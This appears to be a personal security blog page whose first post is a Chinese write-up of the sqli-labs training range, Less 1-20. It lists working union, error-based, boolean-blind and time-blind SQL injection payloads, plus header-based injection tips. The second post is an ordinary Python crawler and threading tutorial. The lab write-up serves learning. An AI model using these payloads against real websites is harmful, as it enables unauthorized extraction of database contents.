<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://su29029.github.io/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 5.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://su29029.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-sqlilab做题总结（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2020-08-28T02:42:36.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/">sqlilab做题总结（一）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="sqlilab做题总结（一）"><a href="#sqlilab做题总结（一）" class="headerlink" title="sqlilab做题总结（一）"></a>sqlilab做题总结（一）</h2><p>开始重新系统学习sql注入，本地docker搭建了一个sqlilab的靶场，今天先搞1-20.</p>
<h5 id="Less1-4"><a href="#Less1-4" class="headerlink" title="Less1-4"></a>Less1-4</h5><p>Less1-4是最简单的四种情况，采用最基本的联合查询注入即可完成。注意不同的引号/括号闭合方式。主要有Less1:单引号闭合型，Less2:无任何引号or括号(数字型)，Less3:单引号加括号，Less4:双引号加括号。</p>
<p>主要注入payload(以Less1为例)：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 判断显示位，本题为3列，其中第二列为Login name,第三列为password</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 数据库名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>),<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 数据表名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>),<span class="number">3</span> %<span class="number">23</span> <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>

<h5 id="Less5-10"><a href="#Less5-10" class="headerlink" title="Less5-10"></a>Less5-10</h5><p>这六个题主要考察报错注入和盲注(当然也可以全部盲注)，同样注意引号/括号闭合方式的不同。</p>
<p>Less5-6可以采用extractvalue,updatexml进行报错注入：(以Less5为例)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(&#x27;asdfasdf&#x27;, concat(&#x27;~&#x27;, (<span class="keyword">select</span> <span class="keyword">database</span>())))) %<span class="number">23</span> <span class="comment"># 数据库名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(&#x27;asdfasdf&#x27;, concat(&#x27;~&#x27;, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>)))) %<span class="number">23</span> <span class="comment"># 数据表名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extractvalue(&#x27;asdfasdf&#x27;, concat(&#x27;~&#x27;, (<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>)))) %<span class="number">23</span> <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>

<p>Less7-8可以采用布尔盲注，写脚本完成。主要借助ascii()函数，substr()等字符串处理函数，if，case when等条件语句，通过对某个目标项的某一位是否等于某个值来进行判断。</p>
<p>以less7为例(注意闭合方式为<code>&#39;))</code>,通过修改start和value的值，一位一位判断database()返回的字符串的每一位的字符是什么，从而达到获取结果的目的。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))and if(ascii(substr(database(),&#123;start&#125;,1))=&#123;value&#125;,1,0) %23 # 数据库名</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="number">1</span>,<span class="number">0</span>) %<span class="number">23</span> <span class="comment"># 表名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="number">1</span>,<span class="number">0</span>) %<span class="number">23</span>   <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>

<p>Less9-10采用时间盲注，思路与7，8相似，不过这次改成了通过判断网页响应时间长短来确定我们盲注的结果是否正确。具体方法即如果判断正确则延迟5秒返回，如果判断错误则立即返回。</p>
<p>以Less9为例：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(database(),&#123;start&#125;,1))=&#123;value&#125;,sleep(5),0) %23 # 数据库名</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">0</span>) %<span class="number">23</span> <span class="comment"># 表名</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(ascii(substr(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">&quot;security&quot;</span> <span class="keyword">and</span> table_name=<span class="string">&quot;XXXXX&quot;</span>,&#123;<span class="keyword">start</span>&#125;,<span class="number">1</span>))=&#123;<span class="keyword">value</span>&#125;,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">0</span>) %<span class="number">23</span>   <span class="comment"># 列名</span></span><br></pre></td></tr></table></figure>

<h5 id="Less11-14"><a href="#Less11-14" class="headerlink" title="Less11-14"></a>Less11-14</h5><p>Less11-14均可采用联合查询注入的形式(username框)，只不过变成了post，注意闭合方式和列数，具体不再赘述。</p>
<h5 id="Less15-16"><a href="#Less15-16" class="headerlink" title="Less15-16"></a>Less15-16</h5><p>同Less7-8,采用布尔盲注完成(username框)。</p>
<h5 id="Less17-20"><a href="#Less17-20" class="headerlink" title="Less17-20"></a>Less17-20</h5><p>Less17:username框经过测试发现存在转义，无法注入，但password框可以，虽然是update语句，同理直接闭合引号随后报错注入即可。</p>
<p>Less18:本题username框和password框全部存在转义，根据题目提示User-Agent请求头可以进行注入，故尝试User-Agent处闭合单引号随后报错注入。</p>
<p>Less19:本题提示Referer，故尝试Referer处报错注入即可。</p>
<p>Less20:本题提示Cookie，观察Cookie形式后尝试Cookie处报错注入即可。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://su29029.github.io/2020/08/28/sqlilab%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckedn8mth000yfcty7whlhz33" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Python爬虫学习与实战-cnvd网信息爬取" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/08/28/Python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98-cnvd%E7%BD%91%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/" class="article-date">
  <time datetime="2020-08-28T02:41:04.000Z" itemprop="datePublished">2020-08-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/08/28/Python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E6%88%98-cnvd%E7%BD%91%E4%BF%A1%E6%81%AF%E7%88%AC%E5%8F%96/">Python爬虫学习与实战(cnvd网信息爬取)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Python爬虫学习与实战-cnvd网信息爬取"><a href="#Python爬虫学习与实战-cnvd网信息爬取" class="headerlink" title="Python爬虫学习与实战(cnvd网信息爬取)"></a>Python爬虫学习与实战(cnvd网信息爬取)</h2><h4 id="0x00-爬虫基础"><a href="#0x00-爬虫基础" class="headerlink" title="0x00 爬虫基础"></a>0x00 爬虫基础</h4><h5 id="1-python-requests库"><a href="#1-python-requests库" class="headerlink" title="1.python requests库"></a>1.python requests库</h5><p>基础使用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	r = requests.get(<span class="string">&quot;https://www.baidu.com/&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">		r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        print(r.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>几个主要使用方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">request.get(url, params=payload)</span><br><span class="line">request.post(url, data=payload)</span><br><span class="line">request.request(HTTP_METHODS, url, **kwargs)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">HTTP_METHODS:http请求方法</span></span><br><span class="line"><span class="string">url:请求url</span></span><br><span class="line"><span class="string">kwargs:控制参数，主要使用的有：</span></span><br><span class="line"><span class="string">1.params字典序列(主要用于get)</span></span><br><span class="line"><span class="string">2.data字典，字节序列或文件对象(主要用于post)</span></span><br><span class="line"><span class="string">3.cookies字典或者CookieJar，Request中的cookie</span></span><br><span class="line"><span class="string">4.timeout设定超时时间，秒为单位</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="2-正则表达式基础"><a href="#2-正则表达式基础" class="headerlink" title="2.正则表达式基础"></a>2.正则表达式基础</h5><table>
<thead>
<tr>
<th>字符</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>\</td>
<td>将下一个字符标记为一个特殊字符、或一个原义字符、或一个向后引用、或一个八进制转义符。</td>
</tr>
<tr>
<td>^</td>
<td>字符串开始</td>
</tr>
<tr>
<td>$</td>
<td>字符串结束</td>
</tr>
<tr>
<td>*</td>
<td>匹配前面的子表达式零次或多次，例如，zo*能匹配“<code>z</code>”以及“<code>zoo</code>“</td>
</tr>
<tr>
<td>+</td>
<td>匹配前面的子表达式一次或多次。例如，“<code>zo+</code>”能匹配“<code>zo</code>”以及“<code>zoo</code>”，但不能匹配“<code>z</code>”</td>
</tr>
<tr>
<td>?</td>
<td>匹配前面的子表达式零次或一次。例如，“<code>do(es)?</code>”可以匹配“<code>does</code>”或“<code>does</code>”中的“<code>do</code>”</td>
</tr>
<tr>
<td>{n}</td>
<td>匹配n次，例如，“<code>o&#123;2&#125;</code>”不能匹配“<code>Bob</code>”中的“<code>o</code>”，但是能匹配“<code>food</code>”中的两个o。</td>
</tr>
<tr>
<td>{n,}</td>
<td>至少匹配n次</td>
</tr>
<tr>
<td>{n,m}</td>
<td>至少匹配n次，最多m次</td>
</tr>
<tr>
<td>.</td>
<td>匹配除“<code>\</code>*<code>n</code>*”之外的任何单个字符。</td>
</tr>
<tr>
<td>(pattern)</td>
<td>匹配pattern并获取这一匹配。</td>
</tr>
<tr>
<td>(?:pattern)</td>
<td>匹配pattern但不获取匹配结果</td>
</tr>
<tr>
<td>x|y</td>
<td>匹配x或y</td>
</tr>
<tr>
<td>[xyz]</td>
<td>匹配字符集合，例如，“<code>[abc]</code>”可以匹配“<code>plain</code>”中的“<code>a</code>”</td>
</tr>
<tr>
<td>[a-z]</td>
<td>匹配字符范围，例如，“<code>[a-z]</code>”可以匹配“<code>a</code>”到“<code>z</code>”范围内的任意小写字母字符。</td>
</tr>
<tr>
<td>[^a-z]</td>
<td>负值字符范围。匹配任何不在指定范围内的任意字符。例如，“<code>[^a-z]</code>”可以匹配任何不在“<code>a</code>”到“<code>z</code>”范围内的任意字符。</td>
</tr>
<tr>
<td>\d</td>
<td>匹配一个数字</td>
</tr>
<tr>
<td>\D</td>
<td>匹配一个非数字</td>
</tr>
<tr>
<td>\n</td>
<td>匹配换行</td>
</tr>
<tr>
<td>\r</td>
<td>匹配回车</td>
</tr>
<tr>
<td>\s</td>
<td>匹配任何空白字符，包括空格、制表符、换页符等等。</td>
</tr>
<tr>
<td>\S</td>
<td>匹配任何非空白字符</td>
</tr>
<tr>
<td>\t</td>
<td>匹配制表符</td>
</tr>
<tr>
<td>\v</td>
<td>匹配垂直制表符</td>
</tr>
<tr>
<td>\w</td>
<td>匹配包括下划线的任何单词字符。等价于“<code>[A-Za-z0-9_]</code>”。</td>
</tr>
</tbody></table>
<h5 id="3-python-re库"><a href="#3-python-re库" class="headerlink" title="3.python re库"></a>3.python re库</h5><p>基础使用：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">strings = [<span class="string">&#x27;I love python&#x27;</span>, <span class="string">&#x27;I love China&#x27;</span>, <span class="string">&#x27;I like running&#x27;</span>]</span><br><span class="line">pattern = <span class="string">r&#x27;^(I)(\s)(love)(\s)(\w+)$&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">    res = re.findall(pattern, strings[i])</span><br><span class="line">    <span class="keyword">if</span> len(res) &gt; <span class="number">0</span>:</span><br><span class="line">        print(strings[i])</span><br><span class="line">        </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">output:</span></span><br><span class="line"><span class="string">I love python</span></span><br><span class="line"><span class="string">I love China</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>几个主要使用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">re.search(pattern, string, flag&#x3D;0) # 在一个字符串中搜索匹配的第一个位置，返回match对象</span><br><span class="line">re.match(pattern, string, flag&#x3D;0) # 在一个字符串的开始位置开始匹配，返回match对象</span><br><span class="line">re.findall(pattern,string) # 搜索字符串，以列表类型返回全部匹配字串</span><br><span class="line">re.split(pattern, string, maxsplit&#x3D;0, flag&#x3D;0) # 将一个字符串按照匹配结果进行分割，返回列表类型</span><br><span class="line">re.sub(pattern, replace, string, count&#x3D;0, flag&#x3D;0) # 在字符串中替换所有匹配的字串，返回替换后的结果</span><br></pre></td></tr></table></figure>

<h5 id="4-python多线程"><a href="#4-python多线程" class="headerlink" title="4.python多线程"></a>4.python多线程</h5><p>Python中使用线程有两种方式：函数或者用类来包装线程对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">函数式：调用 _thread 模块中的start_new_thread()函数来产生新线程。语法如下:</span><br><span class="line"></span><br><span class="line">_thread.start_new_thread ( function, args[, kwargs] )</span><br><span class="line"></span><br><span class="line">参数说明:</span><br><span class="line"></span><br><span class="line">function - 线程函数。</span><br><span class="line">args - 传递给线程函数的参数,他必须是个tuple[数组]类型。</span><br><span class="line">kwargs - 可选参数。</span><br><span class="line">实例：</span><br><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line"></span><br><span class="line">import _thread</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 为线程定义一个函数</span><br><span class="line">def print_time( threadName, delay):</span><br><span class="line">   count &#x3D; 0</span><br><span class="line">   while count &lt; 5:</span><br><span class="line">      time.sleep(delay)</span><br><span class="line">      count +&#x3D; 1</span><br><span class="line">      print (&quot;%s: %s&quot; % ( threadName, time.ctime(time.time()) ))</span><br><span class="line"></span><br><span class="line"># 创建两个线程</span><br><span class="line">try:</span><br><span class="line">   _thread.start_new_thread( print_time, (&quot;Thread-1&quot;, 2, ) )</span><br><span class="line">   _thread.start_new_thread( print_time, (&quot;Thread-2&quot;, 4, ) )</span><br><span class="line">except:</span><br><span class="line">   print (&quot;Error: 无法启动线程&quot;)</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">   pass</span><br><span class="line">执行结果：</span><br><span class="line">    执行以上程序输出结果如下：</span><br><span class="line"></span><br><span class="line">Thread-1: Wed Apr  6 11:36:31 2016</span><br><span class="line">Thread-1: Wed Apr  6 11:36:33 2016</span><br><span class="line">Thread-2: Wed Apr  6 11:36:33 2016</span><br><span class="line">Thread-1: Wed Apr  6 11:36:35 2016</span><br><span class="line">Thread-1: Wed Apr  6 11:36:37 2016</span><br><span class="line">Thread-2: Wed Apr  6 11:36:37 2016</span><br><span class="line">Thread-1: Wed Apr  6 11:36:39 2016</span><br><span class="line">Thread-2: Wed Apr  6 11:36:41 2016</span><br><span class="line">Thread-2: Wed Apr  6 11:36:45 2016</span><br><span class="line">Thread-2: Wed Apr  6 11:36:49 2016</span><br></pre></td></tr></table></figure>

<p>线程模块 Python3 通过两个标准库 _thread 和 threading 提供对线程的支持。</p>
<p>_thread 提供了低级别的、原始的线程以及一个简单的锁，它相比于 threading 模块的功能还是比较有限的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">threading 模块除了包含 _thread 模块中的所有方法外，还提供的其他方法：</span><br><span class="line"></span><br><span class="line">threading.currentThread(): 返回当前的线程变量。</span><br><span class="line">threading.enumerate(): 返回一个包含正在运行的线程的list。正在运行指线程启动后、结束前，不包括启动前和终止后的线程。</span><br><span class="line">threading.activeCount(): 返回正在运行的线程数量，与len(threading.enumerate())有相同的结果。</span><br><span class="line">除了使用方法外，线程模块同样提供了Thread类来处理线程，Thread类提供了以下方法:</span><br><span class="line"></span><br><span class="line">run(): 用以表示线程活动的方法。</span><br><span class="line">start():启动线程活动。</span><br><span class="line">join([time]): 等待至线程中止。这阻塞调用线程直至线程的join() 方法被调用中止-正常退出或者抛出未处理的异常-或者是可选的超时发生。</span><br><span class="line">isAlive(): 返回线程是否活动的。</span><br><span class="line">getName(): 返回线程名。</span><br><span class="line">setName(): 设置线程名。</span><br></pre></td></tr></table></figure>

<h6 id="使用-threading-模块创建线程"><a href="#使用-threading-模块创建线程" class="headerlink" title="使用 threading 模块创建线程"></a>使用 threading 模块创建线程</h6><p>我们可以通过直接从 threading.Thread 继承创建一个新的子类，并实例化后调用 start() 方法启动新线程，即它调用了线程的 run() 方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"># -*- icoding:UTF-8 -*-</span><br><span class="line"># 使用threading模块中的thread类来创建线程</span><br><span class="line"># 本文件不能以threading.py为名，与python中的模块名称重复了</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 定义一个线程类</span><br><span class="line">class myThread(threading.Thread):</span><br><span class="line">    def __init__(self,threadId,name,delay):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadId &#x3D; threadId</span><br><span class="line">        self.name &#x3D; name</span><br><span class="line">        self.delay &#x3D; delay</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&quot;开始线程%s&quot;%(self.name))</span><br><span class="line">        work(self.name,self.delay)</span><br><span class="line">        print(&quot;线程%s结束&quot;%(self.name))</span><br><span class="line">        </span><br><span class="line">def work(name,delay):</span><br><span class="line">    count &#x3D; 0;</span><br><span class="line">    while count &lt; 5:</span><br><span class="line">        time.sleep(delay)</span><br><span class="line">        print(&quot;线程%s正在工作:%s&quot;%(name,time.ctime()))</span><br><span class="line">        count +&#x3D; 1</span><br><span class="line">    </span><br><span class="line">#使用threading模块中的Thread类创建线程</span><br><span class="line">thread1 &#x3D; myThread(1,&quot;工作1&quot;,2)</span><br><span class="line">thread2 &#x3D; myThread(2,&quot;工作2&quot;,2)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    thread1.start()</span><br><span class="line">    print(&quot;当前线程开始阻塞，为已启动线程让位&quot;)</span><br><span class="line">    thread1.join()</span><br><span class="line">    thread2.start()</span><br><span class="line">    print(&quot;已启动线程已运行完毕，启动第二线程，并且当前线程开始开始阻塞，以等待调用join方法的线程先运行完毕&quot;)</span><br><span class="line">    thread2.join()</span><br><span class="line">    print(&quot;主线程结束&quot;)</span><br><span class="line">    </span><br><span class="line">运行结果：</span><br><span class="line">开始线程工作1</span><br><span class="line">当前线程开始阻塞，为已启动线程让位</span><br><span class="line">线程工作1正在工作:Fri Jul  3 10:21:56 2020</span><br><span class="line">线程工作1正在工作:Fri Jul  3 10:21:58 2020</span><br><span class="line">线程工作1正在工作:Fri Jul  3 10:22:00 2020</span><br><span class="line">线程工作1正在工作:Fri Jul  3 10:22:02 2020</span><br><span class="line">线程工作1正在工作:Fri Jul  3 10:22:04 2020</span><br><span class="line">线程工作1结束</span><br><span class="line">开始线程工作2</span><br><span class="line">已启动线程已运行完毕，启动第二线程，并且当前线程开始开始阻塞，以等待调用join方法的线程先运行完毕</span><br><span class="line">线程工作2正在工作:Fri Jul  3 10:22:06 2020</span><br><span class="line">线程工作2正在工作:Fri Jul  3 10:22:08 2020</span><br><span class="line">线程工作2正在工作:Fri Jul  3 10:22:10 2020</span><br><span class="line">线程工作2正在工作:Fri Jul  3 10:22:12 2020</span><br><span class="line">线程工作2正在工作:Fri Jul  3 10:22:14 2020</span><br><span class="line">线程工作2结束</span><br><span class="line">主线程结束</span><br></pre></td></tr></table></figure>

